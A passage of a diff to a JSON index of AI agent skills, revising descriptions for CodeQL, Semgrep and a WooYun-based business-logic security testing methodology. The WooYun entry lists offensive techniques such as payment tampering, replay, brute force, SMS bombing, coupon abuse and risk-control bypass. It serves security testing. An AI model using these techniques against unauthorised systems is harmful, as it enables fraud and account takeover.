       "reduced_body": "**Ideal scenarios:**\n- Source code access with ability to build (for compiled languages)\n- Open-source projects or GitHub Advanced Security license\n- Need for interprocedural data flow and taint tracking\n- Finding complex vulnerabilities requiring AST/CFG analysis\n- Comprehensive security audits where analysis time is not critical\n\n**Consider Semgrep instead when:**\n- No build capability for compiled languages\n- Licensing constraints\n- Need fast, lightweight pattern matching\n- Simple, single-file analysis is sufficient\n\nSimple grep/pattern tools only see one function at a time. Real vulnerabilities often span multiple functions:\n\nCodeQL tracks data flow across all these steps. A tainted input in the handler can be traced through 5+ function calls to find where it reaches a dangerous sink.\n\nPattern-based tools miss this because they can't connect `request.param` in file A to `db.execute(query)` in file B.\n\nDo NOT use this skill for:\n- Projects that cannot be built (CodeQL requires successful compilation for compiled languages)\n- Quick pattern searches (use Semgrep or grep for speed)\n- Non-security code quality checks (use linters instead)\n- Projects without source code access\n\nManual: Download bundle from https://github.com/github/codeql-action/releases\n\nIns...",
       "reduced_body_tokens": 320,
-      "reduced_description": "Run CodeQL static analysis for security vulnerability detection, taint tracking, and data flow analysis. Use when asked to analyze code with CodeQL, create CodeQL databases, write custom QL queries, perform security audits, or set up CodeQL in CI/CD pipelines. **Ideal scenarios:**\n- Source code access with ability to build (for compiled languages)\n- Open-source projects or GitHub Advanced Secur...",
+      "reduced_description": "Run CodeQL static analysis for security vulnerability detection, taint tracking, interprocedural data flow, and path-problem analysis. Use when asked to analyze code with CodeQL, create CodeQL databases, write custom QL queries, investigate source-to-sink paths, or perform deeper security audits in CI/CD pipelines. **Ideal scenarios:**\n- Source code access with ability to build (for compiled la...",
       "reduced_description_tokens": 100,
       "restored_snippets": [],
       "sections": [
@@ -44019,10 +44031,10 @@
     {
       "deduplicated_reference_paths": [],
       "original_body_tokens": 2072,
-      "original_description_tokens": 57,
+      "original_description_tokens": 70,
       "reduced_body": "**Ideal scenarios:**\n- Quick security scans (minutes, not hours)\n- Pattern-based bug detection\n- Enforcing coding standards and best practices\n- Finding known vulnerability patterns\n- Single-file analysis without complex data flow\n- First-pass analysis before deeper tools\n\n**Consider CodeQL instead when:**\n- Need interprocedural taint tracking across files\n- Complex data flow analysis required\n- Analyzing custom proprietary frameworks\n\nDo NOT use this skill for:\n- Complex interprocedural data flow analysis (use CodeQL instead)\n- Binary analysis or compiled code without source\n- Custom deep semantic analysis requiring AST/CFG traversal\n- When you need to track taint across many function boundaries\n\n| Ruleset | Description |\n|---------|-------------|\n| `p/default` | General security and code quality |\n| `p/security-audit` | Comprehensive security rules |\n| `p/owasp-top-ten` | OWASP Top 10 vulnerabilities |\n| `p/cwe-top-25` | CWE Top 25 vulnerabilities |\n| `p/r2c-security-audit` | r2c security audit rules |\n| `p/trailofbits` | Trail of Bits security rules |\n| `p/python` | Python-specific |\n| `p/javascript` | JavaScript-specific |\n| `p/golang` | Go-specific |\n\n| Operator | Description |\n|----------|-------------|\n| `pattern` | Match exact pattern |\n| `patterns`...",
       "reduced_body_tokens": 320,
-      "reduced_description": "Run Semgrep static analysis for fast security scanning and pattern matching. Use when asked to scan code with Semgrep, write custom YAML rules, find vulnerabilities quickly, use taint mode, or set up Semgrep in CI/CD pipelines. **Ideal scenarios:**\n- Quick security scans (minutes, not hours)\n- Pattern-based bug detection\n- Enforcing coding standards and best practices\n- Finding known vulnerabil...",
+      "reduced_description": "Run Semgrep static analysis for fast security scanning, SARIF/JSON output, and lightweight pattern matching. Use when asked to scan code with Semgrep, write lightweight custom YAML rules, find vulnerabilities quickly, use taint mode, or integrate fast checks in CI/CD pipelines. **Ideal scenarios:**\n- Quick security scans (minutes, not hours)\n- Pattern-based bug detection\n- Enforcing coding stan...",
       "reduced_description_tokens": 100,
       "restored_snippets": [],
       "sections": [
@@ -48026,10 +48038,10 @@
         "references/authentication-domain.md"
       ],
       "original_body_tokens": 1643,
-      "original_description_tokens": 109,
+      "original_description_tokens": 59,
       "reduced_body": "**Extended trigger keywords (not in description due to length limits):**\nImplicit black-box testing: \"看看这个功能有没有问题\"、\"这个流程有漏洞吗\"、\"怎么绕过这个限制\"、\"订单/支付/退款流程测试\"、\"这个系统安全吗\"、\"接口有没有风险\"、\"check this API\"、\"is this flow secure\"、\"review this for issues\".\nTools & techniques: 抓包分析、Burp Suite、拦截请求、修改参数、重放攻击、并发测试、遍历ID、爆破、薅羊毛、刷单、套利、风控绕过、短信轰炸、接口滥用、未授权接口、任意文件、数据泄露、信息收集、子域名、目录扫描、指纹识别、intercept、replay、fuzz、enumerate、brute force、rate limiting bypass、coupon abuse.\n\n业务逻辑漏洞无法通过扫描器发现。它们存在于开发者的本意与应用实际允许的行为之间的空隙中。本方法论教会你像编写代码的开发者一样思考，像滥用应用的用户一样发起攻击。\n\n**数据基础：** WooYun（2010-2016），中国最大的漏洞披露平台。\n\n测试应优先考虑高危漏洞类别。下表按 WooYun 数据集中高危发现的比例排序——百分比越高，代表关键影响的可能性越大。\n\n每个阶段都建立在前一阶段的基础上。跳过任何阶段会导致浅层测试，无法发现扫描器无法找到的逻辑漏洞。\n\n在测试任何端点之前，理解应用做了什么，以及资金、数据和权限如何在其中流动。\n\n1. **理解业务**\n   - 这个应用做什么？（电商、银行、社交、SaaS）\n   - 主要参与者是谁？（匿名用户、普通用户、管理员、商户、API 客户端）\n   - 收入模式是什么？（资金如何流动？）\n   - 哪些数据敏感？（个人信息、财务数据、医疗数据、凭证）\n\n2. **映射用户旅程**\n   - 注册 → 登录 → 核心操作 → 登出\n   - 购买 → 支付 → 履行 → 退款\n   - 密码重置 → 验证 → 新密码\n   - 管理员 → 用户管理 → 权限分配\n\n4. **映射信任边界**\n   - 客户端 vs 服务器：哪些验证仅在客户端进行？\n   - 用户 vs 管理员：什么分隔了权限级别？\n   - 租户 vs 租户：什么防止跨租户访问？\n   - 内部 vs 外部：哪些假设了受信任的内部来源？\n\n**第一层：领域参考（方法论 + 攻击模式矩阵）** — 优先加载\n\n**第二层：深度分析手册（技术细节 + 根因分析）** — 需要深入某个技术领域时加载\n\n**对每个领域，使用以下结构形成假设：**\n\n业务逻辑需要手动测试，因为漏洞存在于应用如何解释业务规则的方式中，而不是扫描器可以匹配的技术特征。\n\n1. **准备测试账号**\n   - 至少 2 个相同权限级别的账号（用于水平测...",
       "reduced_body_tokens": 320,
-      "reduced_description": "Use when doing security testing, security audits, bug bounty triage, or business-logic review of web apps, APIs, or business systems. Covers 22,132 WooYun cases across authentication bypass, authorization bypass, payment tampering, information disclosure, logic flaws, and misconfiguration. Also trigger on implicit black-box requests like \"test this endpoint\", \"find bugs\", \"can I bypass this\", \"...",
+      "reduced_description": "WooYun-derived business-logic testing methodology for web apps and APIs. Use when the request involves 支付、退款、订单、越权、认证、授权、价格篡改或业务流程绕过 review, especially black-box probing for price tampering, account takeover, and process bypass flaws. **Extended trigger keywords (not in description due to length limits):**\nImplicit black-box testing: \"看看这个功能有没有问题\"、\"这个流程有漏洞吗\"、\"怎么绕过这个限制\"、\"订单/支付/退款流程测试\"、\"这个系统安全吗\"、...",
       "reduced_description_tokens": 100,
       "restored_snippets": [],
       "sections": [
